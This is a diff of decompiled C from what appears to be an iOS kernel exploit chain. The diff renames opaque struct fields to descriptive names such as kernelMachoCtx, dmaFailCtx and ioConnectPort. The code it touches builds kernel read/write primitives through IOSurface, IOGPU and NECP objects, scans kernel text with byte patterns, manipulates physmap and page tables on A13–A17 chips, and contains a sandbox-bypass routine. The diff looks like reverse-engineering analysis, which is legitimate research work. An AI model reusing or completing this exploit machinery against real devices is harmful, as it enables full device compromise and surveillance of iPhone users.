@@ -810,10 +810,10 @@ static krw_setup_path_t krw_select_setup_path(struct_krwCtx *krwCtx)
 
 static bool krw_has_any_ready_method(struct_krwCtx *krwCtx)
 {
-  bool hasThreadStateKrw = krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->gap_0xD8;
-  bool hasIOConnectKrw = (unsigned int)(*(uint32_t *)&krwCtx->gap_0xE8 + 1) >= 2
-                      && *(uint64_t *)&krwCtx->gap_0xF8
-                      && *(uint64_t *)&krwCtx->gap_0x100;
+  bool hasThreadStateKrw = krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr;
+  bool hasIOConnectKrw = (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
+                      && *(uint64_t *)&krwCtx->ioConnectMappedAddr
+                      && *(uint64_t *)&krwCtx->ioConnectMappedSize;
   bool hasPipePairKrw = krwCtx->krw_pipe_0 != -1
                      && krwCtx->krw_pipe_1 != -1
                      && ((krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218)
@@ -4758,11 +4758,11 @@ __int64 __fastcall necp_send_msg_1(struct_krwCtx *krwCtx)
   v23 = 0;
   v21 = 0;
   v22 = 0;
-  macho_find_text_section(krwCtx->gap_0x19F8, v16);
+  macho_find_text_section(krwCtx->kernelMachoCtx, v16);
   v3 = kernel_pattern_scan((__int64)v16, "08 3D 40 92 09 18 80 52", 0);
   if ( !v3 )
     return v2;
-  v4 = find_kernel_func_aligned((__int64 *)krwCtx->gap_0x19F8, v3 + 8);
+  v4 = find_kernel_func_aligned((__int64 *)krwCtx->kernelMachoCtx, v3 + 8);
   if ( !v4 )
     return v2;
   v5 = v4;
@@ -4784,15 +4784,15 @@ __int64 __fastcall necp_send_msg_1(struct_krwCtx *krwCtx)
     return 163855;
   if ( validate_kaddr_range(krwCtx, v21) )
     return 0;
-  macho_find_text_section(krwCtx->gap_0x19F8, v15);
+  macho_find_text_section(krwCtx->kernelMachoCtx, v15);
   v8 = kernel_pattern_scan((__int64)v15, "1F 01 0A EB 41 00 00 54 C0 03 5F D6 .. .. .. F9", 0);
   if ( v8 )
   {
-    v9 = (__int64 *)find_kernel_func((__int64 *)krwCtx->gap_0x19F8, (__int64 *)(v8 - 8));
+    v9 = (__int64 *)find_kernel_func((__int64 *)krwCtx->kernelMachoCtx, (__int64 *)(v8 - 8));
     if ( v9 )
     {
       v10 = (__int64)v9;
-      v11 = macho_read_u64((__int64 *)krwCtx->gap_0x19F8, v9);
+      v11 = macho_read_u64((__int64 *)krwCtx->kernelMachoCtx, v9);
       v12 = v5 + 7272;
       if ( (unsigned int)krw_read_thunk(krwCtx, v5 + 7272, 4, &v20) )
       {
@@ -5262,8 +5262,8 @@ __int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
   bzero((void *)address, v2);
   v5 = (uint64_t *)address;
   *(uint64_t *)address = krwCtx->gap_0x19D8;
-  v5[4] = krwCtx->gap_0x1898;
-  v5[5] = LODWORD(krwCtx->gap_0x18A0);
+  v5[4] = krwCtx->iogpuKobjPtr2;
+  v5[5] = LODWORD(krwCtx->iogpuObjCount);
   result = create_iogpu_shmem_entry(krwCtx, (uint32_t *)&v16 + 1, &v16, &v15, v5);
   if ( !(uint32_t)result )
   {
@@ -5639,12 +5639,12 @@ __int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
               v14 = *(uint64_t *)(address + 32);
               if ( validate_kaddr_range(krwCtx, v14) )
               {
-                krwCtx->gap_0x1898 = v14;
+                krwCtx->iogpuKobjPtr2 = v14;
                 v15 = (uint64_t *)address;
                 v16 = *(uint64_t *)(address + 40);
                 if ( (unsigned __int64)(v16 - 1) <= 0x1F )
                 {
-                  LODWORD(krwCtx->gap_0x18A0) = v16;
+                  LODWORD(krwCtx->iogpuObjCount) = v16;
                   v18 = 0;
                   v6 = iogpu_init_private_ctx(krwCtx, &v18, object[1], object[2], object[3], v15);
                   if ( !v6 )
@@ -11791,16 +11791,16 @@ bool __fastcall get_kwrite_fn(struct_krwCtx *krwCtx, __int64 *a2, int *a3)
   __int128 v23; // [xsp+18h] [xbp-48h] BYREF
   unsigned __int64 v24; // [xsp+28h] [xbp-38h]
 
-  v6 = krwCtx->gap_0x1888;
+  v6 = krwCtx->pplPhysmapBase;
   if ( v6 )
   {
-    v7 = krwCtx->gap_0x1890;
+    v7 = krwCtx->pplPhysmapSize;
 LABEL_3:
     *a2 = v6;
     *a3 = v7;
     return 1;
   }
-  v9 = krwCtx->gap_0x19F8;
+  v9 = krwCtx->kernelMachoCtx;
   v10 = *(uint32_t *)(v9 + 112);
   if ( v10 > 8791 )
   {
@@ -11844,17 +11844,17 @@ LABEL_15:
   if ( v15 )
   {
     v16 = v15;
-    v17 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v15 - 16));
+    v17 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v15 - 16));
     if ( v17 )
-      v6 = macho_read_u64_thunk(krwCtx->gap_0x19F8, v17);
+      v6 = macho_read_u64_thunk(krwCtx->kernelMachoCtx, v17);
     else
       v6 = 0;
     if ( krwCtx->xnuMajorVersion >= 7195 )
     {
-      v18 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v16 - 8));
+      v18 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v16 - 8));
       if ( !v18 )
         return 0;
-      v19 = macho_read_u64_thunk(krwCtx->gap_0x19F8, v18);
+      v19 = macho_read_u64_thunk(krwCtx->kernelMachoCtx, v18);
       if ( !v19 )
         return 0;
       v7 = v19 - v6;
@@ -11877,8 +11877,8 @@ LABEL_31:
           v7 = 557056;
         }
       }
-      krwCtx->gap_0x1888 = v6;
-      krwCtx->gap_0x1890 = v7;
+      krwCtx->pplPhysmapBase = v6;
+      krwCtx->pplPhysmapSize = v7;
       goto LABEL_3;
     }
     v7 = 0;
@@ -13475,10 +13475,10 @@ void __fastcall necp_send_msg_2(struct_krwCtx *krwCtx)
 {
   void *v1; // x19
 
-  v1 = (void *)krwCtx->gap_0x1D58;
+  v1 = (void *)krwCtx->dmaFailCtx;
   if ( v1 )
   {
-    krwCtx->gap_0x1D58 = 0;
+    krwCtx->dmaFailCtx = 0;
     bzero(v1, 0x520u);
     free(v1);
   }
@@ -13916,13 +13916,13 @@ __int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
   v1 = 708616;
   if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8796, 142, 1, 700, 13) || !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13_A14_A15_A16_A17_MASK) )
     return v1;
-  if ( krwCtx->gap_0x1D58 )
+  if ( krwCtx->dmaFailCtx )
     return 0;
   v3 = (unsigned int *)calloc(1u, 0x520u);
   if ( !v3 )
     return 708617;
   v4 = v3;
-  krwCtx->gap_0x1D58 = v3;
+  krwCtx->dmaFailCtx = v3;
   v5 = krwCtx->mappedKernelRegion_size8byte;
   if ( v5 )
   {
@@ -13961,7 +13961,7 @@ __int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
     *(__int128 *)(v9 + 128) = v12;
     v13 = krwCtx->gap_0x160_size8;
     *(uint64_t *)(v9 + 144) = v13;
-    v14 = krwCtx->gap_0x178_size4;
+    v14 = krwCtx->vmMapSize_size4;
     *(uint32_t *)(v9 + 152) = v14;
     v15 = krwCtx->pageSizeOrSomething;
     *(uint32_t *)(v9 + 56) = v15;
@@ -14112,7 +14112,7 @@ __int64 __fastcall krw_physmap_ctx_init(struct_krwCtx *krwCtx)
                                                                              src_address) )
                                                         {
                                                           v4[52] = ((LODWORD(src_address[0]) >> 10) & 0xFFF) << (LODWORD(src_address[0]) >> 30);
-                                                          v110 = (__int64)krwCtx->gap_0x19F8;
+                                                          v110 = (__int64)krwCtx->kernelMachoCtx;
                                                           *(uint64_t *)&v343 = 0x8B020108F9400008LL;
                                                           *(uint64_t *)v316 = -4193281;
                                                           macho_find_text_section(v110, inputStruct);
@@ -14225,7 +14225,7 @@ LABEL_44:
   }
   if ( !v21 )
     goto LABEL_27;
-  v28 = krwCtx->gap_0x1D58;
+  v28 = krwCtx->dmaFailCtx;
   outputStructCnt = 16;
   v312 = 16;
   v313 = 16;
@@ -14235,7 +14235,7 @@ LABEL_44:
     v30 = krw_task_for_name(krwCtx, v29, "backboardd");
     if ( v30 )
     {
-      v31 = krwCtx->gap_0x1D58;
+      v31 = krwCtx->dmaFailCtx;
       v32 = kreadptr(krwCtx, v30);
       if ( v32 )
       {
@@ -14523,7 +14523,7 @@ LABEL_89:
   v61 = 0;
   *((uint64_t *)v4 + 41) = address[0];
   *((uint64_t *)v4 + 42) = v53;
-  v62 = krwCtx->gap_0x1D58;
+  v62 = krwCtx->dmaFailCtx;
   v63 = *(uint64_t *)(v62 + 296);
   v64 = *((uint64_t *)v4 + 34);
   v65 = *(uint64_t *)(v62 + 328);
@@ -14562,8 +14562,8 @@ LABEL_89:
                         krwCtx,
                         (v76 << v77)
                       + (int)((((v74 >> 3) & 0xFFFFFFFC) | ((v74 >> 29) & 3)) << 12)
-                      + ((unsigned __int64)&v73[*(uint64_t *)(krwCtx->gap_0x1D58 + 296LL)
-                                              - *(uint64_t *)(krwCtx->gap_0x1D58 + 328LL)]
+                      + ((unsigned __int64)&v73[*(uint64_t *)(krwCtx->dmaFailCtx + 296LL)
+                                              - *(uint64_t *)(krwCtx->dmaFailCtx + 328LL)]
                        & 0xFFFFFFFFFFFFF000LL),
                         inputStruct)) )
   {
@@ -14574,7 +14574,7 @@ LABEL_89:
   *((uint64_t *)v4 + 43) = *(uint64_t *)inputStruct + 72LL;
   if ( v220 )
     goto LABEL_26;
-  v78 = (uint64_t *)krwCtx->gap_0x1D58;
+  v78 = (uint64_t *)krwCtx->dmaFailCtx;
   v80 = (char *)v78[41];
   v79 = v78[42];
   v81 = (unsigned __int64)&v80[v79];
@@ -14706,7 +14706,7 @@ LABEL_190:
   if ( !v118 )
     goto LABEL_26;
 LABEL_191:
-  v119 = (uint64_t *)krwCtx->gap_0x1D58;
+  v119 = (uint64_t *)krwCtx->dmaFailCtx;
   v343 = xmmword_43080;
   LODWORD(v344[0]) = 335544320;
   *(__int128 *)v316 = xmmword_43090;
@@ -14744,7 +14744,7 @@ LABEL_191:
     *((uint64_t *)v4 + 53) = 0;
     goto LABEL_26;
   }
-  v131 = (uint64_t *)krwCtx->gap_0x1D58;
+  v131 = (uint64_t *)krwCtx->dmaFailCtx;
   v132 = (char *)v131[41];
   v133 = v131[37];
   *((uint64_t *)v4 + 53) = v130 - v132 + v133;
@@ -14783,7 +14783,7 @@ LABEL_249:
     *((uint64_t *)v4 + 55) = 0;
     goto LABEL_26;
   }
-  v138 = &v137[*(uint64_t *)(krwCtx->gap_0x1D58 + 296LL) - *(uint64_t *)(krwCtx->gap_0x1D58 + 328LL)];
+  v138 = &v137[*(uint64_t *)(krwCtx->dmaFailCtx + 296LL) - *(uint64_t *)(krwCtx->dmaFailCtx + 328LL)];
   *((uint64_t *)v4 + 55) = v138;
   if ( !v138 )
     goto LABEL_26;
@@ -14804,7 +14804,7 @@ LABEL_221:
   v141 = ((v140 >> 3) & 0x1FFFFC) | ((v140 >> 29) & 3);
   if ( ((v140 >> 3) & 0x100000) != 0 )
     v141 |= 0xFFFFFFFFFFF00000LL;
-  v142 = krwCtx->gap_0x1D58;
+  v142 = krwCtx->dmaFailCtx;
   v143 = *(uint64_t *)(v142 + 328);
   v144 = *(uint64_t *)(v142 + 296);
   v145 = &v139[v144 - v143 + v141];
@@ -14917,7 +14917,7 @@ LABEL_230:
     *((uint64_t *)v4 + 64) = 0;
     goto LABEL_26;
   }
-  v165 = krwCtx->gap_0x1D58;
+  v165 = krwCtx->dmaFailCtx;
   v166 = *(uint64_t *)(v165 + 328);
   v167 = *(uint64_t *)(v165 + 296);
   *((uint64_t *)v4 + 64) = &v164[v167 - v166];
@@ -14971,7 +14971,7 @@ LABEL_269:
   if ( (uint32_t)v1 )
     goto LABEL_27;
   v1 = 708617;
-  v179 = (uint64_t *)krwCtx->gap_0x1D58;
+  v179 = (uint64_t *)krwCtx->dmaFailCtx;
   LODWORD(size[0]) = 0x4000;
   v180 = alloc_physmap_page(krwCtx, (unsigned int *)size);
   if ( !v180 )
@@ -15143,7 +15143,7 @@ LABEL_320:
   {
 LABEL_382:
     v232 = krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A13);
-    v233 = krwCtx->gap_0x1D58;
+    v233 = krwCtx->dmaFailCtx;
     v234 = *(uint64_t **)(v233 + 600);
     v235 = *(uint64_t *)(v233 + 608);
     if ( v232 )
@@ -15495,7 +15495,7 @@ LABEL_431:
     if ( (uint32_t)v1 )
       goto LABEL_27;
     v1 = 708617;
-    v281 = krwCtx->gap_0x1D58;
+    v281 = krwCtx->dmaFailCtx;
     *(uint32_t *)inputStruct = 552;
     if ( krwCtx->mappedKernelRegion_size8byte && krwCtx->mappedKernelSize_size8byte )
     {
@@ -15513,12 +15513,12 @@ LABEL_431:
     return 0;
   }
   v1 = 708617;
-  v202 = krwCtx->gap_0x1D58;
+  v202 = krwCtx->dmaFailCtx;
   v203 = *(uint64_t *)(v202 + 600);
   v204 = *(uint64_t *)(v202 + 608);
   LODWORD(size[0]) = 0x4000;
   if ( !(unsigned int)krw_read_thunk(krwCtx, *(uint64_t *)(v202 + 592), 8, &outputStruct)
-    || (v205 = (uint64_t *)krwCtx->gap_0x1D58,
+    || (v205 = (uint64_t *)krwCtx->dmaFailCtx,
         v206 = v205[74],
         v207 = v205[96],
         LODWORD(input[0]) = 0x4000,
@@ -15732,7 +15732,7 @@ LABEL_378:
     goto LABEL_378;
   }
 LABEL_27:
-  krwCtx->gap_0x1D58 = 0;
+  krwCtx->dmaFailCtx = 0;
   free(v4);
   return v1;
 }
@@ -15919,7 +15919,7 @@ char *__fastcall scan_physmap_state_entries(struct_krwCtx *krwCtx, uint32_t *a2,
   char *v7; // x11
   __int64 v9; // x11
 
-  v4 = krwCtx->gap_0x1D58;
+  v4 = krwCtx->dmaFailCtx;
   result = *(char **)(v4 + 328);
   v6 = &result[*(uint64_t *)(v4 + 336)];
   if ( result >= v6 )
@@ -15958,7 +15958,7 @@ __int64 __fastcall lookup_sptm_state_entry(struct_krwCtx *krwCtx, unsigned __int
   __int64 v8; // x20
   __int64 v10; // [xsp+8h] [xbp-18h] BYREF
 
-  v4 = krwCtx->gap_0x1D58;
+  v4 = krwCtx->dmaFailCtx;
   v5 = v4[37];
   if ( v5 > a2 || v4[39] + v5 <= a2 )
     v6 = 0;
@@ -15987,7 +15987,7 @@ unsigned __int64 __fastcall read_pgtable_entry(struct_krwCtx *krwCtx, unsigned _
 
   if ( !(unsigned int)krw_read_thunk(
                         krwCtx,
-                        *(uint64_t *)(krwCtx->gap_0x1D58 + 592LL) + ((a2 >> 33) & 0x38),
+                        *(uint64_t *)(krwCtx->dmaFailCtx + 592LL) + ((a2 >> 33) & 0x38),
                         8,
                         &v12)
     || (v12 & 1) == 0 )
@@ -16121,7 +16121,7 @@ __int64 __fastcall setup_physmap_rw_multi(struct_krwCtx *krwCtx, unsigned __int6
   __int64 v24; // [xsp+38h] [xbp-58h]
 
     krwCtx = krwCtx;
-  v3 = krwCtx->gap_0x1D58;
+  v3 = krwCtx->dmaFailCtx;
   v4 = v3[96];
   size[0] = 0x4000;
   v5 = a2 + 0x8000000000LL;
@@ -16215,7 +16215,7 @@ void __fastcall setup_macho_section_dispatch(struct_krwCtx *krwCtx, __int64 a2, 
   __int64 v5; // x9
   uint64_t *v6; // x8
 
-  v3 = krwCtx->gap_0x1D58;
+  v3 = krwCtx->dmaFailCtx;
   v4 = v3[75];
   v5 = v3[76];
   v6 = (uint64_t *)v3[85];
@@ -16267,7 +16267,7 @@ __int64 __fastcall get_kernel_version_build_0(struct_krwCtx *krwCtx, __int64 a2,
   __int64 v30; // [xsp+A0h] [xbp-50h]
 
   v23 = a2;
-  v6 = krwCtx->gap_0x1D58;
+  v6 = krwCtx->dmaFailCtx;
   v21 = 0x4000;
   v7 = alloc_physmap_page(krwCtx, &v21);
   if ( !v7 )
@@ -18468,19 +18468,19 @@ bool __fastcall krw_setup_ports_vm(struct_krwCtx *krwCtx, uint32_t *a2)
         v16 = *(uint64_t *)(v24 + 8);
         if ( validate_kaddr_range(krwCtx, v16) )
         {
-          krwCtx->gap_0xF0 = v16;
+          krwCtx->ioConnectKernelValue = v16;
           v17 = *(unsigned int *)(v24 + 16);
           v18 = *(uint32_t *)(v24 + 20);
           v19 = krw_xpac_vaddr_2(krwCtx, *(uint64_t *)(address + v17));
           if ( validate_kaddr_range(krwCtx, v19) )
           {
             v20 = connection[0];
-            krwCtx->gap_0xE8 = connection[1];
-            krwCtx->gap_0xF8 = address;
-            krwCtx->gap_0x100 = v4;
-            krwCtx->gap_0x114 = v20;
-            krwCtx->gap_0x110 = v18;
-            krwCtx->gap_0x108 = v17;
+            krwCtx->ioConnectPort = connection[1];
+            krwCtx->ioConnectMappedAddr = address;
+            krwCtx->ioConnectMappedSize = v4;
+            krwCtx->ioConnectMemPort = v20;
+            krwCtx->ioConnectDataSize = v18;
+            krwCtx->ioConnectDataOffset = v17;
             fd_close(v23);
             v13 = 1;
             goto LABEL_24;
@@ -19062,18 +19062,18 @@ bool __fastcall krw_setup_physmap(struct_krwCtx *krwCtx)
   {
     return true;
   }
-  v5 = krwCtx->gap_0xE8;
+  v5 = krwCtx->ioConnectPort;
   if ( v5 + 1 < 2 )
     return false;
-  if ( !krwCtx->gap_0xF8 )
+  if ( !krwCtx->ioConnectMappedAddr )
     return false;
-  if ( !krwCtx->gap_0x100 )
+  if ( !krwCtx->ioConnectMappedSize )
     return false;
-  if ( (unsigned int)(krwCtx->gap_0x114 + 1) < 2 )
+  if ( (unsigned int)(krwCtx->ioConnectMemPort + 1) < 2 )
     return false;
-  v19[0] = krwCtx->gap_0x114;
+  v19[0] = krwCtx->ioConnectMemPort;
   v19[1] = v5;
-  if ( !krwCtx->gap_0x19D0_size8 || !krwCtx->gap_0xF0 )
+  if ( !krwCtx->gap_0x19D0_size8 || !krwCtx->ioConnectKernelValue )
     return false;
   memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 131075, &object_handle, 0);
   result = false;
@@ -19087,9 +19087,9 @@ bool __fastcall krw_setup_physmap(struct_krwCtx *krwCtx)
       bzero((void *)address, v2);
       v8 = address;
       *(uint64_t *)address = krwCtx->gap_0x19D0_size8;
-      *(uint64_t *)(v8 + 8) = krwCtx->gap_0xF0;
-      *(uint32_t *)(v8 + 16) = krwCtx->gap_0x108;
-      *(uint32_t *)(v8 + 20) = krwCtx->gap_0x110;
+      *(uint64_t *)(v8 + 8) = krwCtx->ioConnectKernelValue;
+      *(uint32_t *)(v8 + 16) = krwCtx->ioConnectDataOffset;
+      *(uint32_t *)(v8 + 20) = krwCtx->ioConnectDataSize;
       result = vm_deallocate(mach_task_self_, v8, v2);
       v9 = 0;
       v10 = &v18;
@@ -19162,7 +19162,7 @@ bool __fastcall krw_setup_iosurface(struct_krwCtx *krwCtx)
   if ( *portSlot + 1 > 1 )
     return true;
   if ( (unsigned int)(krwCtx->threadForKernelRead + 1) < 2
-    || !krwCtx->gap_0xD8
+    || !krwCtx->threadStateKrwPhysAddr
     || (unsigned int)(krwCtx->ioSurfaceMemEntryMaybe + 1) < 2 )
   {
     return false;
@@ -19172,10 +19172,10 @@ bool __fastcall krw_setup_iosurface(struct_krwCtx *krwCtx)
   if ( v4 )
     return false;
   if ( !krwCtx->gap_0x19D0_size8
-    || !krwCtx->gap_0x80
-    || !krwCtx->gap_0x88
-    || !krwCtx->gap_0xA0
-    || !krwCtx->gap_0xA8_size4 )
+    || !krwCtx->physmapBasePhys
+    || !krwCtx->physmapSize
+    || !krwCtx->percpuBasePhys
+    || !krwCtx->percpuSize )
   {
     return false;
   }
@@ -19189,12 +19189,12 @@ bool __fastcall krw_setup_iosurface(struct_krwCtx *krwCtx)
       bzero((void *)address, v1);
       v7 = (uint64_t *)address;
       *(uint64_t *)address = krwCtx->gap_0x19D0_size8;
-      v7[4] = krwCtx->gap_0x1898;
-      v7[5] = krwCtx->gap_0x18A0;
-      v7[6] = krwCtx->gap_0x80;
-      v7[7] = krwCtx->gap_0x88;
-      v7[8] = krwCtx->gap_0xA0;
-      v7[9] = krwCtx->gap_0xA8_size4;
+      v7[4] = krwCtx->iogpuKobjPtr2;
+      v7[5] = krwCtx->iogpuObjCount;
+      v7[6] = krwCtx->physmapBasePhys;
+      v7[7] = krwCtx->physmapSize;
+      v7[8] = krwCtx->percpuBasePhys;
+      v7[9] = krwCtx->percpuSize;
       status = vm_deallocate(mach_task_self_, (vm_address_t)v7, v1);
       v9 = 0;
       v10 = 1;
@@ -19293,12 +19293,12 @@ bool __fastcall krw_setup_iosurface_v2(struct_krwCtx *krwCtx, uint32_t *a2)
           v19 = *(uint64_t *)(address + 32);
           if ( validate_kaddr_range(krwCtx, v19) )
           {
-            krwCtx->gap_0x1898 = v19;
+            krwCtx->iogpuKobjPtr2 = v19;
             v20 = address;
             v21 = *(uint64_t *)(address + 40);
             if ( (unsigned __int64)(v21 - 1) <= 0x1F )
             {
-              krwCtx->gap_0x18A0 = v21;
+              krwCtx->iogpuObjCount = v21;
               krwCtx->ioSurfaceMemEntryMaybe = object[0];
               v22 = *(uint64_t *)(v20 + 48);
               if ( v22 )
@@ -19316,10 +19316,10 @@ bool __fastcall krw_setup_iosurface_v2(struct_krwCtx *krwCtx, uint32_t *a2)
                         v25 = *(uint32_t *)(v20 + 72);
                         if ( v25 )
                         {
-                          krwCtx->gap_0x80 = v22;
-                          krwCtx->gap_0x88 = v23;
-                          krwCtx->gap_0xA0 = v24;
-                          krwCtx->gap_0xA8_size4 = v25;
+                          krwCtx->physmapBasePhys = v22;
+                          krwCtx->physmapSize = v23;
+                          krwCtx->percpuBasePhys = v24;
+                          krwCtx->percpuSize = v25;
                           v9 = krw_read_validation(krwCtx, 1);
                           if ( !v9 )
                           {
@@ -19416,7 +19416,7 @@ mach_vm_address_t __fastcall build_kernel_vtable(struct_krwCtx *krwCtx, __int64 
   size[0] = v16;
   if ( !krwCtx->gap_0x200 )
   {
-    macho_find_text_section(krwCtx->gap_0x19F8, &v32);
+    macho_find_text_section(krwCtx->kernelMachoCtx, &v32);
     v29 = v32;
     v30 = v33;
     v17 = kernel_pattern_scan((__int64)&v32, "00 00 01 91 C0 03 5F D6", 0);
@@ -20077,7 +20077,7 @@ unsigned __int64 __fastcall find_kernel_func_versioned(__int64 *someStruct, int 
   krwCtx = KRWCTX_FROM_UINTPTR(someStruct[35]);
   if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
   {
-    macho_find_text_section(krwCtx->gap_0x19F8, text_range);
+    macho_find_text_section(krwCtx->kernelMachoCtx, text_range);
     scan_range[0] = text_range[0];
     scan_range[1] = text_range[1] + text_range[2] - 0x20000;
     scan_range[2] = 0x20000;
@@ -20175,7 +20175,7 @@ __int64 __fastcall find_kernel_func_at_offset(struct_krwCtx *krwCtx, int a2)
   {
     if ( a2 )
       return 0;
-    v5 = krwCtx->gap_0x19F8;
+    v5 = krwCtx->kernelMachoCtx;
     v6 = get_sptm_version_index((__int64)v5);
     macho_find_text_section((__int64)v5, v9);
     v7 = "09 .. 00 F9 E1 03 00 32 00 00 80 52";
@@ -22755,7 +22755,7 @@ LABEL_117:
       free_entry_struct(v8, v6);
       return v9;
     }
-    v8 = krwCtx->gap_0x19F8;
+    v8 = krwCtx->kernelMachoCtx;
     if ( !v8 )
     {
 LABEL_116:
@@ -22778,7 +22778,7 @@ LABEL_116:
         v23 = krwCtx->xnuVersionPacked;
         if ( v23 < XNU_VERSION_PACKED(7195, 0, 46, 0, 0) )
         {
-          v27 = krwCtx->gap_0x19F8;
+          v27 = krwCtx->kernelMachoCtx;
           if ( v23 < XNU_VERSION_PACKED(6153, 102, 2, 0, 0) )
             v28 = v22 - 2;
           else
@@ -22792,20 +22792,20 @@ LABEL_112:
         {
           do
           {
-            LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->gap_0x19F8, (__int64 *)((char *)v22 - 4));
+            LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->kernelMachoCtx, (__int64 *)((char *)v22 - 4));
             if ( (v8 & 0x9F000000) == 0x90000000 )
             {
-              LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->gap_0x19F8, v22);
+              LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->kernelMachoCtx, v22);
               if ( (v8 & 0xBFC00000) == 0xB9400000 )
                 goto LABEL_111;
             }
             else if ( (uint32_t)v8 == -721215457 )
             {
-              LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->gap_0x19F8, v22);
+              LODWORD(v8) = (unsigned __int64)macho_read_u32(krwCtx->kernelMachoCtx, v22);
               if ( BYTE3(v8) == 88 )
               {
 LABEL_111:
-                v27 = krwCtx->gap_0x19F8;
+                v27 = krwCtx->kernelMachoCtx;
                 v28 = (__int64 *)((char *)v22 - 4);
                 goto LABEL_112;
               }
@@ -22884,7 +22884,7 @@ LABEL_115:
                       *(__int128 *)(v18 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
                       *(__int128 *)(v18 + 128) = v39;
                       *(uint64_t *)(v18 + 144) = krwCtx->gap_0x160_size8;
-                      *(uint32_t *)(v18 + 152) = krwCtx->gap_0x178_size4;
+                      *(uint32_t *)(v18 + 152) = krwCtx->vmMapSize_size4;
                       *(uint32_t *)(v18 + 56) = krwCtx->pageSizeOrSomething;
                       LODWORD(v8) = iosurface_physmap_setup_bool(v18, 0, v38, 0);
                       if ( (uint32_t)v8 )
@@ -22915,11 +22915,11 @@ LABEL_115:
           v8 = kernel_pattern_scan((__int64)v45, v40, 0);
           if ( v8 )
           {
-            v8 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v8 - 12));
+            v8 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v8 - 12));
             if ( v8 )
             {
               v19 = v8;
-              v20 = krwCtx->gap_0x19F8;
+              v20 = krwCtx->kernelMachoCtx;
               goto LABEL_102;
             }
           }
@@ -22931,11 +22931,11 @@ LABEL_115:
           v8 = kernel_pattern_scan((__int64)v45, "E0 03 13 AA 01 00 80 52 02 05 80 52 .. .. .. .. E0 03", 0);
           if ( v8 )
           {
-            v8 = find_kernel_func(krwCtx->gap_0x19F8, (__int64 *)(v8 - 20));
+            v8 = find_kernel_func(krwCtx->kernelMachoCtx, (__int64 *)(v8 - 20));
             if ( v8 )
             {
               v19 = v8 + krwCtx->stride_0x168;
-              v20 = krwCtx->gap_0x19F8;
+              v20 = krwCtx->kernelMachoCtx;
               goto LABEL_102;
             }
           }
@@ -24414,12 +24414,12 @@ mach_vm_address_t __fastcall setup_sandbox_bypass(struct_krwCtx *krwCtx, char a2
       result = necp_set_opt_string_7(krwCtx, krwCtx->gap_0x37C_size4, 0);
       if ( (uint32_t)result )
       {
-        v5 = krwCtx->gap_0x18E0_size8;
+        v5 = krwCtx->cachedSelfTaskKaddr;
         if ( !v5 )
         {
           v15[0] = 0;
           v5 = get_kobj_and_resolve_kaddr(krwCtx, mach_task_self_, v15);
-          krwCtx->gap_0x18E0_size8 = v5;
+          krwCtx->cachedSelfTaskKaddr = v5;
           krwCtx->gap_0x18E8 = v15[0];
         }
         vm_attr_increment_offset_bounded(krwCtx, v5, 10);
@@ -24645,7 +24645,7 @@ LABEL_6:
   v5 = 6648;
   if ( !has_flag )
     v5 = 7448;
-  v6 = has_flag ? (uint64_t)krwCtx->gap_0x19F8 : krwCtx->sandboxMachoCtx;
+  v6 = has_flag ? (uint64_t)krwCtx->kernelMachoCtx : krwCtx->sandboxMachoCtx;
   if ( !v6 )
     return 0;
   macho_getsectbyname("__TEXT", v6, "__cstring", &v14);
@@ -24848,7 +24848,7 @@ __int64 __fastcall find_macho_entry_by_name(struct_krwCtx *krwCtx, char *__s2, u
   __int128 v30; // [xsp+48h] [xbp-68h]
 
   v5 = a3;
-  v8 = krwCtx->gap_0x1A00;
+  v8 = krwCtx->auxkcMachoCtx;
   if ( v8 )
   {
     v9 = macho_find_loadcmd_by_name(v8, __s2, a3);
@@ -24881,7 +24881,7 @@ LABEL_6:
   v14 = krwCtx->mappedKernelRegion;
   if ( !v14 || !krwCtx->mappedKernelSize || (v15 = *(uint64_t *)(v14 + 264)) == 0 )
   {
-    v16 = find_kernel_func_by_scan(krwCtx->gap_0x19F8);
+    v16 = find_kernel_func_by_scan(krwCtx->kernelMachoCtx);
     if ( !v16 )
       return 0;
     v15 = v16;
@@ -25657,7 +25657,7 @@ bool __fastcall krw_ctx_has_read_caps(struct_krwCtx *krwCtx)
     if ( KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_SELF_TASK_IPC_OFFSET)
       && KRW_CTX_AT(krwCtx, uint64_t, KRW_CTX_OLD_PTRAUTH_BASE_OFFSET) )
     {
-      if ( krwCtx->gap_0xB )
+      if ( krwCtx->isSandboxed )
       {
         v5 = 8388864;
         goto LABEL_16;
@@ -25666,11 +25666,11 @@ bool __fastcall krw_ctx_has_read_caps(struct_krwCtx *krwCtx)
     }
     return 0;
   }
-  if ( krwCtx->gap_0x1944 == -1
-    || uuid_is_null(krwCtx->raw_0x1948)
-    || !krwCtx->gap_0x1958 )
+  if ( krwCtx->necpFd == -1
+    || uuid_is_null(krwCtx->necpClientUuidAndState)
+    || !krwCtx->necpClientKaddr )
     return 0;
-  if ( !krwCtx->gap_0xB )
